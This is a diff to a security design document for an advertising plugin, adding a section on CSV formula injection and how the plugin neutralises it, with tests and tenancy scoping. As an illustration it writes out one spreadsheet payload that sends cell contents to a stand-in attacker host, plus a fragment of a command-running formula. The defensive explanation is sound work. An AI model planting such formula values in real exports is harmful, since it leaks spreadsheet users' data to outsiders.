@@ -108,6 +108,12 @@ Every `admin-post` handler calls `check_admin_referer()`. Security tests cover n
 
 Autosave accepts a field allowlist derived from the same schema the validator uses, so mass assignment is structurally impossible rather than defended against — a field that is not in the schema has nowhere to land.
 
+**CSV export is a second injection surface, and it is not an HTML one.** Excel, LibreOffice and Sheets evaluate a cell beginning `=`, `+`, `-`, `@`, tab or carriage return as a formula when the file is opened. A campaign named `=HYPERLINK("https://attacker.example"&A1,"Click")` is a name this plugin accepts and escapes perfectly for HTML — and correct RFC 4180 quoting does not help either, because `"=cmd|…"` is a well-formed quoted field that still evaluates.
+
+`Domain\Csv_Writer` therefore prefixes every formula-leading field with an apostrophe before quoting it. The apostrophe is the convention every major spreadsheet strips on display, so the reader still sees what the advertiser typed. `CsvWriterTest` asserts each payload class, and `ReportExportTest` asserts it end to end through a real campaign title. The response also carries `X-Content-Type-Options: nosniff`, so a browser cannot sniff an advertiser-controlled CSV back into something it will render.
+
+The export is gated on the Reporting module and scoped to the caller's own organization, resolved from the session — never from a request parameter. It is the one bulk read of exactly the data the tenancy boundary exists to separate, so it is tested against a second organization and against house rows rather than only against itself.
+
 Rate limits apply to upload, autosave, submission, campaign copy, login, signup and password
 recovery. Authenticated
 operations are counted per user; anonymous account operations use a hashed
